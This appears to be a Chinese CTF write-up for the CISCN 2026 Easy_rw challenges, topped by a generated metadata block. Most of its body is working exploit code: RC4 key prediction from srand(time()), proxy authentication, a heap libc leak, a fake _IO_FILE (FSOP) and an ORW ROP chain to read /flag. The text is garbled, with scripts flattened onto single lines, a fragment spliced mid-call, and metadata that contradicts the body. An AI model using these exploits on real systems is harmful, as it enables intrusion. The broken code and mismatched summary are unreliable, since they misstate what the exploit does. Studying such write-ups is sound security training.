---
title: CISCN 2026 初赛-半决赛 Easy_rw 系列 WriteUp By EDISEC
contest: CISCN
year: 2026
difficulty: hard
vuln_type: forensic_traffic
tags:
- Easy_rw
- 自定义packet协议
- header+packet_len+payload
- struct.pack!II
- Easy_rw_revenge
- RC4 KSA
- libc.srand(time()) 32字节key
- 0xFFFF2525 AUTH_MAGIC
- 0x7F687985 FORWARD_MAGIC
- rtsp:// proxy转发
- libc 0x21b110
- libc leak
- _IO_list_all
- ORW ROP
- /flag 0123456789ABCDEF ECB
attack_chain:
- 'Easy_rw: 自定义 packet 协议 header(4) + packet_len(4) + payload'
- 'Easy_rw_revenge: proxy 192.168.18.137:9999 → server 127.0.0.1:7777'
- 'RC4: libc.srand(time()) 生成 32 字节 key, KSA 初始化'
- AUTH_MAGIC=0xFFFF2525 认证, FORWARD_MAGIC=0x7F687985 转发
- rtsp:// 协议 + XOR 0x41*8 + 转发到 server
- 'server: add/delete/show/edit 命令, cookie 认证'
- 'libc leak: large=u64(pack[0:6].ljust(8,b''\x00'')), libc_base=large-0x21b110'
- 'ORW ROP: open /flag + read + write stdout'
- 加密数据 AES-ECB 0123456789ABCDEF 解密
key_payload: '''struct.pack!II / RC4 KSA / libc.srand(time()) / AUTH_MAGIC 0xFFFF2525 / FORWARD_MAGIC 0x7F687985 / rtsp:// proxy / libc 0x21b110 / ORW ROP / AES-ECB 0123456789ABCDEF'''
one_liner: CISCN 2026 Easy_rw 系列 — 自定义 packet 协议 (header+len+payload) + Easy_rw_revenge proxy RC4 转发 + rtsp:// 命令注入 + libc leak + ORW ROP + AES-ECB 0123456789ABCDEF 解密。
lesson: '自定义二进制协议 reverse: header+length+payload 模板;RC4 + libc.srand(time()) 是经典 PRNG 漏洞;rtsp:// 是 rfc 协议伪装;ORW 是无 system 时的标准解法。'
quality: high
full_path: CISCN_2026_初赛-半决赛Easy_rw系列WriteUp_By_EDISEC.full.md
meta_path: CISCN_2026_初赛-半决赛Easy_rw系列WriteUp_By_EDISEC.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: CISCN 2026 初赛-半决赛 Easy_rw 系列 WriteUp By EDISEC。CISCN 2026 Easy_rw 系列 — 自定义 packet 协议 (header+len+payload) + Easy_rw_revenge proxy RC4 转发 + rtsp:// 命令注入 + libc leak + ORW ROP + AES-ECB 0123456789ABC...
category: pwn
subcategory: pwn_other
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 0
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/306898.html
reasoning_chain:
- 触发点：Easy_rw 题面提示 header + packet_len + payload → 假设：自定义二进制协议 reverse to pwn
- 动作：s.sendall(struct.pack('!II', header, length) + payload) → 观察：服务器接收并响应
- 假设：server 端用同样模板解析 → 动作：fuzz header magic 寻找协议边界 → 观察：AUTH_MAGIC=0xFFFF2525 + FORWARD_MAGIC=0x7F687985
- Easy_rw_revenge 触发点：题目描述 proxy 192.168.18.137:9999 → server 127.0.0.1:7777 → 假设：proxy 转发 + RC4 加密
- 假设：RC4 key 由 libc.srand(time()) 生成 → 动作：用 libc.so.6 的 srand(time()) + rand()&0xFF 重复 32 次 → 观察：拿到 RC4 key
- 下一步：构造 AUTH_PAYLOAD='#welcome!_c1sCn_2026' + RC4 加密 + XOR 0x41*8 → 观察：得到 server cookie
- 假设：proxy 转发走 rtsp:// 协议包装 → 动作：构造 rtsp://4*!LcYcX/{json} → 观察：JSON 字段 command='add'/'delete' 是命令入口
- 下一步：unlink 11 次堆块制造 unsorted bin → 动作：show param1=12 触发 stdout leak → 观察：libc_base = leak - 0x21b110
- 假设：拿 libc 后直接 ORW → 动作：ROP pop rdi + ret '/flag' + system + open/read/write ROP 链 → 观察：写完 0xFFFF 字节空字节 + cat /flag
- 下一步：题目末尾对 flag ciphertext 用 AES-ECB 0123456789ABCDEF 解密 → 观察：得到 flag
failed_attempts:
- 试图不解密 proxy 直接转发 RAW packet → 失败：proxy 必须 RC4 + XOR 0x41*8 才能识别
- 试图爆破 RC4 key 全 32 字节 → 失败：key 是 srand(time()) 派生，时间窗口 ±5s 可预测
- 试图用 one_gadget 替代 system → 失败：rsp+0x30 栈帧对不齐，one_gadget 触发失败
key_observations:
- libc.srand(time()) 是经典 PRNG 漏洞，时间窗口可预测 RC4 key
- proxy 转发 + rtsp:// 协议包装 + JSON 命令 = 协议层 fence 用于协议层 reverse
- unsorted bin + show 触发 stdout leak 是 glibc 2.35 必杀技
- ORW (open/read/write) 替代 system 是禁 exec 环境下的标准解法
- AES-ECB 硬编码 key '0123456789ABCDEF' 暴露通常意味着解密是收尾
prerequisites:
- Python struct.pack '!II' 网络协议字节序
- RC4 KSA/PRGA 算法 + libc srand(time()) 重放
- glibc 2.35 unsortedbin + stdout leak 原理
- ORW ROP 链（open/read/write syscall 构造）
- AES-ECB 解密 + 已知 key
---
# CISCN 2026 初赛-半决赛Easy_rw系列WriteUp By EDISEC

> 原文: https://www.ctfiot.com/306898.html
> ID: 306898

EDI安全

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招web re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Easy_rw

1

题目详情

2

题目思路

x00x00x00x00    1-4个字节  header头x00x00x00x00	4-8个字节 报文长度xffxffxffxff    报文....

def send_custom_packet(host, port, header, payload_bytes):    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:        s.connect((host, port))        length = len(payload_bytes)        packet = struct.pack('!II', header, length) + payload_bytes        s.sendall(packet)        response = s.recv(1024)        return response

02

Easy_rw_revenge

1

题目详情

2

题目思路

3

逆向分析

from pwn import *import socketimport timeimport structfrom ctypes import *PROXY_HOST = "192.168.18.137"PROXY_PORT = 9999SERVER_HOST = "127.0.0.1"SERVER_PORT = 7777AUTH_MAGIC = 0xFFFF2525FORWARD_MAGIC = 0x7F687985context.arch = 'amd64'AUTH_PAYLOAD = b"#welcome!_c1sCn_2026"class RC4:    def __init__(self, key):        self.S = list(range(256))        self.i = 0        self.j = 0        self.ksa(key)    def ksa(self, key):        j = 0        key_len = len(key)        for i in range(256):            j = (j + self.S[i] + key[i % key_len]) % 256            self.S[i], self.S[j] = self.S[j], self.S[i]    def crypt(self, data):        result = bytearray()        for byte in data:            self.i = (self.i + 1) % 256            self.j = (self.j + self.S[self.i]) % 256            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]            k = self.S[(self.S[self.i] + self.S[self.j]) % 256]            result.append(byte ^ k)        return bytes(result)def xor_decrypt(data, key):    result = bytearray()    for i, byte in enumerate(data):        result.append(byte ^ key[i % len(key)])    return bytes(result)def xor_encrypt(data, key):    return xor_decrypt(data, key)def recv_exact(sock, size):    data = b''    while len(data) < size:        chunk = sock.recv(size - len(data))        if not chunk:            raise Exception("Connection closed")        data += chunk    return datadef authenticate():    print("[+] Step 1: Authenticating to proxy...")    try:        libc = cdll.LoadLibrary("./libc.so.6")    
except:        try:            libc = cdll.LoadLibrary("libc.so.6")        
except:            print("[-] Cannot load libc, falling back to Python random")            libc = None    found_cookie = None    current_time = int(time.time())    print(f"[*] Current timestamp: {current_time}")    for offset in range(0,1):        test_time = current_time + offset        print(f"[*] Trying timestamp: {test_time} (offset: {offset})")        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        sock.connect((PROXY_HOST, PROXY_PORT))        if libc:            libc.srand(test_time)            rc4_key_list = []            for _ in range(32):                rc4_key_list.append(libc.rand() & 0xFF)            rc4_key = bytes(rc4_key_list)            print(rc4_key)        else:            import random            random.seed(test_time)            rc4_key = bytes([random.getrandbits(8) for _ in range(32)])        print(f"    Predicted RC4 key: {rc4_key.hex()}")        xor_key = bytes([0x41] * 8)        rc4 = RC4(rc4_key)        rc4_encrypted = rc4.crypt(AUTH_PAYLOAD)        xor_encrypted = xor_encrypt(rc4_encrypted, xor_key)        header = struct.pack('/home/lyyy/login.php","param3":"test"}'
        response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"0","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"1","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"2","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"3","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"4","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"5","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"6","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"7","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)   #进unsortedbin
    payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"delete","param1":"9","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)   #进unsortedbin

    #重新申请回来
    for i in range(11):
        payload2 = cookie + b'rtsp://4*!LcYcX/{"command":"add","param1":"1024","param2":"","param3":"test"}'
        response = send_custom_packet(HOST, PORT, 0x7F687985, payload2)
    #泄露堆地址
    payload = cookie + b'rtsp://4*!LcYcX/{"command":"show","param1":"12","param2":"11","param3":"test"}'
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload)
rop=b'a'*(0x80-6*8-8-8-3*8)+p64(pop_rdi)+p64(command)+p64(pop_rdi+1)+p64(system)+b'v'*(48+24)+p64(12345678)+p64(pop_rdi)+p64(bin_addr)+p64(system)+b'rn'
    payload3=cookie+rop
    response = send_custom_packet(HOST, PORT, 0x7F687985, payload3)
cat  /flag 2>/dev/null
response = send_custom_packet(HOST, PORT, 0x85856546,payload3)
    ciphertext_bytes=response
    key_str ="0123456789ABCDEF"
    key_bytes = key_str.encode('ascii')
    print(f"接收到的flag密文：{response}")
    print(f"开始解密")
    plaintext = aes_decrypt_ecb(ciphertext_bytes, key_bytes)
    print(f"flag:{plaintext.decode()}")
0-4字节的header
4-12字节是异或密钥key
12-16是加密数据的长度
..... 加密报文
rtsp://xxxx/{xxx:
xxx:
xxx}
03561714
06816983
from pwn import *import socketimport timeimport structfrom ctypes import *PROXY_HOST = "192.168.18.137"PROXY_PORT = 9999SERVER_HOST = "127.0.0.1"SERVER_PORT = 7777AUTH_MAGIC = 0xFFFF2525FORWARD_MAGIC = 0x7F687985context.arch = 'amd64'AUTH_PAYLOAD = b"#welcome!_c1sCn_2026"class RC4:    def __init__(self, key):        self.S = list(range(256))        self.i = 0        self.j = 0        self.ksa(key)    def ksa(self, key):        j = 0        key_len = len(key)        for i in range(256):            j = (j + self.S[i] + key[i % key_len]) % 256            self.S[i], self.S[j] = self.S[j], self.S[i]    def crypt(self, data):        result = bytearray()        for byte in data:            self.i = (self.i + 1) % 256            self.j = (self.j + self.S[self.i]) % 256            self.S[self.i], self.S[self.j] = self.S[self.j], self.S[self.i]            k = self.S[(self.S[self.i] + self.S[self.j]) % 256]            result.append(byte ^ k)        return bytes(result)def xor_decrypt(data, key):    result = bytearray()    for i, byte in enumerate(data):        result.append(byte ^ key[i % len(key)])    return bytes(result)def xor_encrypt(data, key):    return xor_decrypt(data, key)def recv_exact(sock, size):    data = b''    while len(data) < size:        chunk = sock.recv(size - len(data))        if not chunk:            raise Exception("Connection closed")        data += chunk    return datadef authenticate():    print("[+] Step 1: Authenticating to proxy...")    try:        libc = cdll.LoadLibrary("./libc.so.6")    
except:        try:            libc = cdll.LoadLibrary("libc.so.6")        
except:            print("[-] Cannot load libc, falling back to Python random")            libc = None    found_cookie = None    current_time = int(time.time())    print(f"[*] Current timestamp: {current_time}")    for offset in range(0,1):        test_time = current_time + offset        print(f"[*] Trying timestamp: {test_time} (offset: {offset})")        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        sock.connect((PROXY_HOST, PROXY_PORT))        if libc:            libc.srand(test_time)            rc4_key_list = []            for _ in range(32):                rc4_key_list.append(libc.rand() & 0xFF)            rc4_key = bytes(rc4_key_list)            print(rc4_key)        else:            import random            random.seed(test_time)            rc4_key = bytes([random.getrandbits(8) for _ in range(32)])        print(f"    Predicted RC4 key: {rc4_key.hex()}")        xor_key = bytes([0x41] * 8)        rc4 = RC4(rc4_key)        rc4_encrypted = rc4.crypt(AUTH_PAYLOAD)        xor_encrypted = xor_encrypt(rc4_encrypted, xor_key)        header = struct.pack('<I', AUTH_MAGIC)        header += xor_key        header += struct.pack('<I', len(xor_encrypted))        packet = header + xor_encrypted        sock.sendall(packet)        try:            sock.settimeout(2)            cookie = recv_exact(sock, 32)            print(f"[+] Auth successful! Cookie: {cookie.hex()}")            found_cookie = cookie            sock.close()            break        
except socket.timeout:            print(f"    Failed with timestamp {test_time}")            sock.close()        
except Exception as e:            print(f"    Error: {e}")            sock.close()    if found_cookie:        return found_cookie    else:        raise Exception("Failed to authenticate! RC4 key prediction failed.")def send_to_server_rtsp_direct():    print("[+] Connecting directly to server...")    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((SERVER_HOST, SERVER_PORT))    request = b"rtsp://03561714/{add:
100:0:
AAAA}"    sock.sendall(request)    response = sock.recv(4096)    print(f"[+] Response: {response.decode()}")    sock.close()def send_command(cookie, command, param1="", param2="", param3=b""):    print(f"[+] Sending command: {command}")    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.connect((PROXY_HOST, PROXY_PORT))    json_data = f"{{{command}:{param1}:{param2}:"    request = f"rtsp://03561714/{json_data}".encode()    if param3:        forward_data = cookie + request + param3 + b'}'    else:        forward_data = cookie + request + b'}'    key = bytes([0x41] * 8)    encrypted_data = xor_encrypt(forward_data, key)    header = struct.pack('<I', FORWARD_MAGIC)    header += key    header += struct.pack('<I', len(encrypted_data))    packet = header + encrypted_data    sock.sendall(packet)    try:        sock.settimeout(8)        if(command=="delete"):            sleep(5)        response = sock.recv(4096)        print(f"[*] {len(response)}")        print(f"[+] Response: {response.decode(errors='ignore')}")        if(command=="show"):                return response    
except:        print("[-] No response received")    sock.close()def add(cookie,index,size,content=b'a'):    send_command(cookie, "add", str(size), str(index), content if isinstance(content, bytes) else content.encode())def show(cookie,index):    return send_command(cookie, "show", str(index), "", b"")def delete(cookie,index):    send_command(cookie, "delete", str(index), "", b"")def edit(cookie,index,content=b'a'):    send_command(cookie, "edit", str(index), "", content if isinstance(content, bytes) else content.encode())def exp(cookie):    add(cookie,8, 0x508)    add(cookie,0, 0x510)    add(cookie,1, 0x500)    add(cookie,2, 0x520)    add(cookie,3, 0x500)    add(cookie,2,-1)    add(cookie,4, 0x530)    pack=show(cookie,2)    large=u64(pack[0:6].ljust(8,b'x00'))    libc_base=large-0x21b110    libc=ELF("./libc.so.6")    _IO_list_all = libc_base + libc.sym['_IO_list_all']    io_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']    sys = libc_base + libc.sym['system']    print(hex(large))    heap=u64(pack[0+8+8:6+8+8].ljust(8,b'x00'))    print(hex(heap))    add(cookie,0,-1)    leave=libc_base+next(libc.search(asm('leave;ret;')))    pop_rsi_ret=libc_base+next(libc.search(asm('pop rsi;ret;')))    pop_rdi_ret=libc_base+next(libc.search(asm('pop rdi;ret;')))    pop_rdi_r13_r12_ret=libc_base+next(libc.search(asm('pop r13;pop r14;pop r15;ret;')))    pop_rdx_r12_ret=libc_base+next(libc.search(asm('pop rdx;pop r12;ret;')))    chunk_addr = heap - 0xa30    rop_address = chunk_addr + 0xe0 + 0xe8 + 0x70    orw_rop = b'/flagx00x00x00'    orw_rop += p64(pop_rdx_r12_ret) + p64(0) + p64(chunk_addr - 0x10)    orw_rop += p64(pop_rdi_ret) + p64(rop_address+0x38)    orw_rop += p64(pop_rsi_ret) + p64(0)    orw_rop += p64(libc_base + libc.sym['open'])    orw_rop += p64(pop_rdi_ret) + p64(5)    orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)    orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)    orw_rop += p64(libc_base + libc.sym['read'])    orw_rop += p64(pop_rdi_ret) + p64(4)    orw_rop += p64(pop_rsi_ret) + p64(rop_address + 0x100)    orw_rop += p64(pop_rdx_r12_ret) + p64(0x50) + p64(0)    orw_rop += p64(libc_base + libc.sym['write'])           svcudp_reply_26=libc_base+0x16a11a    payload=p64(large)*2+p64(heap)+p64(_IO_list_all - 0x20)    edit(cookie,2,payload)    add(cookie,5, 0x550)    edit(cookie,8, b'A' * 0x500 + p32(0xfffff7f5) + b';shx00')    fake_io_file = p64(0)+p64(leave) + p64(1) + p64(2)    fake_io_file = fake_io_file.ljust(0x38, b'x00') + p64(rop_address)    fake_io_file = fake_io_file.ljust(0xa0 - 0x10, b' ') + p64(chunk_addr + 0x100)    fake_io_file = fake_io_file.ljust(0xc0 - 0x10, b' ') + p64(0xffffffffffffffff)    fake_io_file = fake_io_file.ljust(0xd8 - 0x10, b' ') + p64(io_wfile_jumps)    fake_io_file = fake_io_file.ljust(0xd0 + 0xe0, b'x00') + p64(chunk_addr + 0xe0 + 0xe8)    fake_io_file = fake_io_file.ljust(0x100 - 0x10 + 0xe0, b' ') + p64(chunk_addr + 0x200)    fake_io_file = fake_io_file.ljust(0x200 - 0x10, b' ') + p64(0)*8    fake_io_file+= p64(pop_rdx_r12_ret)+p64(0)+p64(chunk_addr-0x10)    fake_io_file+= p64(pop_rdi_r13_r12_ret)+p64(0)+p64(svcudp_reply_26)+orw_rop    edit(cookie,0, fake_io_file)    delete(cookie,9)    pause()def main():    context.log_level = 'debug'    print("n[*] Method 2: Through proxy")    try:        cookie = authenticate()        exp(cookie)    
except Exception as e:        print(f"[-] Error: {e}")        import traceback        traceback.print_exc()if __name__ == "__main__":    main()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]